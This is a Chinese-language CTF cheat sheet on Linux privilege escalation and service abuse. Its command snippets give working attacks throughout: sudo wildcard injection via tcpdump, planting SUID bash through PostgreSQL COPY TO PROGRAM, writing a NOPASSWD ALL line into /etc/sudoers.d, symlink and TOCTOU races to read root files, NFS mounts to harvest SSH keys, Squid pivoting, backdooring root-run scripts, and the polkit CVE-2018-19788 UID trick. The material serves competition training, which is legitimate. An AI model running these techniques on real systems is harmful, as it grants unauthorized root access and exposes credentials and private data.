---
title: Linux 提权与服务滥用
phase: misc
vuln_class: [misc, privesc, sudo, cron, service, database]
summary: 提权题的判据是「root 会替我执行什么」——不是找内核漏洞，而是找 root 定时/按需执行的可写脚本、可注入参数、可覆盖路径。sudo 规则要看二线参数，不只看主二进制。
---

# Linux 提权与服务滥用

逃出 shell 约束见 [[misc/沙箱逃逸/bashjails.md|Bash 沙箱与受限 shell 逃逸]]；Windows 侧见 [[forensics/磁盘与内存/windows.md|Windows 取证]]。

## 0. 判据速查

| 观察到什么 | 结论 | 去哪节 |
|---|---|---|
| `sudo -l` 里有通配符 `*` | fnmatch 跨参数匹配，可注入额外 flag | §1 |
| sudo 规则里有 `file` / `tar` / `find` / `awk` | 二线参数是逃逸口，查 GTFOBins | §4 |
| sudo 允许编辑某通配路径下的文件 | 建软链指向目标，sudo 只校验字面路径 | §5 |
| 有 setuid 二进制做 stat→open | TOCTOU，双循环抢窗口 | §6 |
| root cron 从可写目录拷文件 | 放 SUID bash，拷完属主变 root | §2 |
| 有 `/etc/sudoers.d/` 可写 | 二进制格式文件也能塞，sudo 解析器容错 | §3 |
| 见到 PostgreSQL 超级用户 | `COPY TO PROGRAM` 即 RCE | §7 |
| 有 NFS `(everyone)` 导出 | 免认证挂载，找备份与私钥 | §8 |
| 有 3128 Squid | 代理打 127.0.0.1 上的内网服务 | §9 |
| root 服务从用户目录跑脚本 | 改脚本等触发 | §10 |
| UID > 2147483647 能建 | CVE-2018-19788 polkit 整数溢出 | §11 |
| 只有 Unix socket 的服务 | SSH `-L` 能转发 socket | §12 |

## 1. sudo 通配符：fnmatch 跨参数

sudoers 里的 `*` 用 **`fnmatch()` 且不带 `FNM_PATHNAME`**，所以 `*` 能匹配**空格和斜杠**——一个 `*` 就能吞进一整串新参数。

规则 `/usr/bin/tcpdump -c10 -w/var/cache/captures/*/[UUID]` 里，`*` 匹配 `x -Z root -r/path -w/etc/sudoers.d`：

```bash
sudo /usr/bin/tcpdump -c10 \
  -w/var/cache/captures/x \
  -Z root \
  -r/var/cache/captures/.../crafted.pcap \
  -w/etc/sudoers.d/output_uuid \
  -F/var/cache/captures/filter.uuid
```

三个要点：`-Z root` 阻止降权（产物属主保持 root）、**第二个 `-w` 覆盖第一个**（多数工具取最后一个值）、`-r` 让它读自制 pcap 而不是抓包。

## 2. root 拷贝可写目录 → SUID 传递

root cron 整目录拷贝时，**文件属主变成 root，但 SUID 位保留**。

```sql
COPY (SELECT '') TO PROGRAM 'cp /bin/bash /var/lib/postgresql/14/main/bash && chmod 4777 /var/lib/postgresql/14/main/bash';
```

拷完之后 `/opt/backups/current/bash -p` 就是 root shell（`-p` 保留 euid）。

**判据**：cron 的源目录你写得进去，且目标是整目录 `cp -a`/`rsync`/`tar`。单文件拷贝不一定改属主。

## 3. 二进制文件塞进 `/etc/sudoers.d/`

**sudo 的 yacc 解析器有错误恢复**：遇到语法错误的行跳到下一个换行继续；**cron 的解析器则整个文件作废**。所以 `/etc/sudoers.d/` 能吃二进制文件，`/etc/cron.d/` 不行。

```python
payload = b"\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n"
# 二进制头里避开 0x0a：用 192.168.x.x 而不是 10.x.x.x
```

**为什么避开 `10.x`**：`0x0a` 就是换行符，`10.0.0.1` 这种 IP 在二进制头里会打断你的 sudoers 行。同理端口和时间戳也要挑不含 `0x0a` 的值。

## 4. sudo 二线参数

审计 sudo 规则时**不能只看主二进制**，这些参数本身就是逃逸口：

| 参数 | 作用 |
|---|---|
| `file -m <dir>` | 从指定目录读 magic 定义，报错里吐出该目录下所有文件名 |
| `tar --to-command` | 解包时执行命令 |
| `find -exec` | 直接执行 |
| `awk -f` | 读脚本执行 |
| `vim` 的 `:!` | shell |

```bash
sudo -u santa file -m /root/ .
# 报错列出 /root/ 下每个文件名
```

`sudo -l` 出来之后**每一条都去 GTFOBins 查一遍**，这是最省时的固定动作。

## 5. sudo 通配路径 + 软链（confused deputy）

`ctf ALL=(root) NOPASSWD: /usr/bin/vim /home/ctf/*/*/HackMe2.txt` —— glob 约束的是**路径字符串**，不是它指向的文件。

```bash
mkdir -p ~/a/b
ln -s /root/flag.txt ~/a/b/HackMe2.txt
sudo /usr/bin/vim /home/ctf/a/b/HackMe2.txt
# vim 内 :!cat % 打印 /root/flag.txt
```

**sudo 只对字面 argv 做匹配，`open()` 自己会解软链**。任何「只允许编辑这个文件」的通配规则都可这么破——`less`/`cat`/`head`/`tail`/`cp`/`chmod`/`truncate` 一样适用。

## 6. TOCTOU 软链替换

setuid 程序 `stat()` 查权限、再 `open()` 打开——中间有窗口。

```bash
while true; do ln -sf dummy.txt link; ln -sf /root/flag.txt link; done &
while true; do ./FileChecker link 2>/dev/null | grep -m1 'MCA{' && break; done
```

**判据**：任何「先检查后使用」的两系统调用模式（`stat`→`open`、`access`→`fopen`）都可抢。`access(2)` 在手册里明确写了不能用于安全决策。

**窗口太窄时**：`renameat2(RENAME_EXCHANGE)` 原子交换，或 userfaultfd / inotify 同步，比 bash 循环快几个数量级。

## 7. PostgreSQL → OS 命令

超级用户等价于 OS 命令执行。

```sql
COPY (SELECT '') TO PROGRAM 'id > /tmp/test.txt';
SELECT pg_read_file('/tmp/test.txt');
SELECT pg_read_file('/etc/passwd');
```

**`COPY TO PROGRAM` 没有回显**，必须落到临时文件再 `pg_read_file()` 读回来。这是最容易卡住的一步。

**备份里挖凭据**：`pg_basebackup` 的 `global/1260` 就是 `pg_authid` 表，里面是 SCRAM-SHA-256 哈希（`SCRAM-SHA-256$4096:salt$stored:server`），可离线爆破。用 Docker 起同版本 postgres 挂载备份目录就能完整还原库。

## 8. NFS 免认证挂载

```bash
showmount -e TARGET
mount -t nfs TARGET:/var/backups /mnt/backups
mount -t nfs TARGET:/home /mnt/home
```

导出为 `(everyone)` 时无需任何凭据。**枚举阶段就查 `showmount -e`**：`/home` 里常有 SSH 私钥，`/var/backups` 里常有数据库导出。

## 9. Squid 打内网

```bash
curl -x http://TARGET:3128 http://127.0.0.1:9191/app
export http_proxy=http://TARGET:3128
```

3128 端口上的 Squid 是通往 `127.0.0.1` 绑定服务的跳板。**用 `-x` 逐个试常见内网端口**（8080/9090/9191/5000/3000），外部扫描看不到它们。

## 10. root 服务跑用户可写脚本

systemd 单元 `ExecStart` 指向 `/home/user/...` 且没有 `User=` 时，整条链路以 root 运行。

```bash
echo 'chmod u+s /bin/bash' >> ~/server/bin/linux-x64/server-command
curl -b /tmp/cookies.txt "http://localhost:9191/print-deploy/admin/api/mobilityServers/v2?refresh=true"
bash -p
```

**检查方法**：把 `ExecStart` 的路径逐段 `ls -la`，任何一段可写就是提权点。

## 11. CVE-2018-19788：polkit 整数溢出

polkit 把大于 `INT_MAX`（`2147483647`）的 UID 当成「未知用户」并**跳过认证**。

```bash
useradd -u 4020181224 -m loluser
su loluser
# ~/pwn.service: ExecStart=/bin/bash -c 'cat /root/flag > /tmp/out'
systemctl enable --now /home/loluser/pwn.service
```

**记住这个常数 4020181224**，看到「能建超大 UID 用户」就立刻想到它。修复后的 polkit 把非法 UID 当作**永远拒绝**。

## 12. SSH 转发 Unix socket

服务只监听 Unix socket 时，`-L` 也能转发。

```bash
sshpass -p 'password' ssh -T -o StrictHostKeyChecking=no \
  -fNL 25432:/var/run/postgresql/.s.PGSQL.5432 user@TARGET
psql -h localhost -p 25432 -U postgres
```

**`-T -fN` 三个参数缺一不可**：`-T` 不分配终端、`-f` 转后台、`-N` 不执行命令。这样即使用户的登录 shell 是 `/bin/false` 也能用——因为根本没起 shell。

## 13. 其他速查

- **Zabbix 改密**：有 MySQL 就直接 `UPDATE users SET passwd='<bcrypt>' WHERE username='Admin'`。**用户名大小写敏感**（`Admin` 不是 `admin`）。
- **Apache `-d` 最后一个生效**：多个 `-d` 时取最后一个，配 `-E` 把错误日志重定向到可读文件；配置里写 `Include /root/root.txt` 会让 Apache 把 flag 当指令解析，内容进错误信息（`AH00526: Invalid command 'FLAG...'`）。
- **Monit 的 `pgrep` 注入**：root 脚本用 `pgrep -lfa` 抓命令行再执行时，用 `perl -e '$0="假命令行"; sleep 300'` 伪造进程，把额外 flag 塞进去。
- **WinSSHTerm 凭据**：`.NET` 程序，ILSpy 反编译后按 PBKDF2-HMAC-SHA1（1012 轮）→ 密钥拆分（偶数位 NOT / 奇数位 NOT）→ 再 PBKDF2 的层次解开；主密码常能用 rockyou 破。

## 14. 纪律

- **先找「root 替我执行什么」**，别一上来找内核漏洞。CTF 提权 95% 是配置问题：可写脚本、可注入参数、可覆盖路径。
- **sudo 规则要逐参数看**。主二进制通常没问题，问题在 `-m`、`--to-command`、`-f`、`-exec` 这些二线参数上。
- **通配符规则默认有洞**。只要 sudo 规则里出现 `*`，就同时考虑「跨参数注入」和「软链指向目标」两条路。
- **属主变更比权限位更值钱**。SUID 位本身没用，得配合「root 拷贝」把属主变成 root 才成立。
